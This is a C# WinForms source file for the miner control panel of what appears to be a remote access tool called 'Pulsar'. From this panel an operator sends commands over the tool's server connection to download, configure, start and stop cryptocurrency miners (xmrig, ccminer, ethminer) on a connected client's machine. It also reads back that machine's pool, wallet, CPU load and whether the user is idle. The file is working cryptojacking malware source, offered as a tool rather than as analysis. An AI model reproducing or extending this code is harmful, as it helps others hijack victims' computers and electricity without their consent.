using Newtonsoft.Json.Linq;
using server.Classes;
using server.Others;
using System;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
namespace server.Forms
{
    public partial class frm_miner : Form
    {
        public frm_miner()
        {
            InitializeComponent();
        }
        public int id;
        public string data = "";
        public int cpuval = 0;
        public string config;
        public string cmd;
        void disableButtons(bool val)
        {
            Link1.Enabled = val;
            flatComboBox1.Enabled = val;
            Args.Enabled = val;
            Wall.Enabled = val;
            flatButton1.Enabled = val;
        }

        private void flatButton1_Click(object sender, EventArgs e)
        {
            if (!Link1.Text.EndsWith(".zip") || Link1.Text.StartsWith("http"))
            {
                MessageBox.Show("invalid link zip files with no passwords only please", "Pulsar", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            if (string.IsNullOrEmpty(flatComboBox1.Text))
            {
                MessageBox.Show("Select a miner", "Pulsar", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            if (string.IsNullOrEmpty(Args.Text))
            {
                MessageBox.Show("Put in some args !", "Pulsar", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }


            Refrech.Enabled = false;
            string sp = "~";

            data += "minne$r_setup" + sp + Link1.Text + sp + flatComboBox1.Text + sp + Args.Text + sp + Wall.Text;
            Form1.MainServer.Send(id, Helper.Getbytes(data), Common.Current_Key);
            MessageBox.Show(data);
            data = "";
            disableButtons(false);

            panel1.Visible = true;

        }

        private void flatButton2_Click(object sender, EventArgs e)
        {
            this.Close();

        }

        private void Refrech_Tick(object sender, EventArgs e)
        {
            Form1.MainServer.Send(id, Helper.Getbytes("MINER_SYS"), Common.Current_Key);
            updateprogbar();
        }

        private void flatButton3_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(id, Helper.Getbytes("MINER_SYS"), Common.Current_Key);
            updateSpecialInfo();
        }
        public void updateprogbar()
        {



            Color red = Color.Red;
            Color orange = Color.Orange;
            Color blue = Color.Blue;
            cpu_prog.Value = cpuval;
            flatLabel22.Text = cpu_prog.Value.ToString() + "%";
            if (cpuval < 20)
            {
                cpu_prog.ProgressColor = orange;
            }
            else if (cpuval < 40)
                cpu_prog.ProgressColor = orange;
            else if (cpuval < 60)
                cpu_prog.ProgressColor = red;
        }
        private void updateSpecialInfo()
        {

            if (isinstaled.Text == "True")
            {
                Form1.MainServer.Send(id, Helper.Getbytes("minne$r_config"), Common.Current_Key);
                Thread.Sleep(2000);
                if (File.Exists(Common.current_path + @"\minerConfig.json"))
                {
                    string json = File.ReadAllText(Common.current_path + @"\minerConfig.json");
                    dynamic data = JObject.Parse(json);
                    string PoolsData = Convert.ToString(data.pools);
                    PoolsData = PoolsData.Replace('[', ' ');
                    PoolsData = PoolsData.Replace(']', ' ');
                    dynamic data2 = JObject.Parse(PoolsData);
                    algo_lbl.Text = Convert.ToString(data2.algo);
                    pool_lbl.Text = Convert.ToString(data2.url);
                    wallet_lbl.Text = Convert.ToString(data2.user);



                }


            }
        }
        private void refrechToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(id, Helper.Getbytes("minne$r_config"), Common.Current_Key);

        }

        private void refrechToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (statue.Text == "True")
            {
                Form1.MainServer.Send(id, Helper.Getbytes("minne$r_cmd"), Common.Current_Key);
                loges_cmd.Text = cmd;
            }
            else
            {
                MessageBox.Show("The miner has not been started yet...", "Pulsar Miner", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string config = fastColoredTextBox1.Text;
            Form1.MainServer.Send(id, Helper.Getbytes("minne$r_newconfig" + "~" + config), Common.Current_Key);
        }

        private void flatButton4_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(id, Helper.Getbytes("minne$r_start"), Common.Current_Key);


        }

        private void flatButton5_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(id, Helper.Getbytes("minne$r_stop"), Common.Current_Key);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (isinstaled.Text == "True")
            {
                isinstaled.ForeColor = Color.Green;
                fastColoredTextBox1.Enabled = true;
                loges_cmd.Enabled = true;
            }
            else
            {
                isinstaled.ForeColor = Color.Red;
                fastColoredTextBox1.Enabled = false;
                loges_cmd.Enabled = false;
            }


            if (user_idl.Text == "True")
                user_idl.ForeColor = Color.Green;
            else
                user_idl.ForeColor = Color.Red;

            if (statue.Text == "True")
                statue.ForeColor = Color.Green;

            else
                statue.ForeColor = Color.Red;

        }

        private void Link1_TextChanged(object sender, EventArgs e)
        {

        }

        private void frm_miner_Load(object sender, EventArgs e)
        {
            Refrech.Start();
        }

        private void tabPage4_Click(object sender, EventArgs e)
        {

        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Refrech.Stop();
            Form1.MainServer.Send(id, Helper.Getbytes("MINER"), Common.Current_Key);


        }

        private void flatComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (flatComboBox1.Text)
            {
                case "xmrig":
                    Args.Text = "json file";
                    Args.Enabled = false;
                    break;
                case "ccminer":
                    Args.Text = "Config File";
                    Args.Enabled = false;
                    break;
                case "ethminer":
                    Args.Enabled = true;
                    Args.Text = "-P stratum1+ssl://[WALLET].WORKERNAME@[POOL:PORT]";
                    break;
            }
        }
    }
}
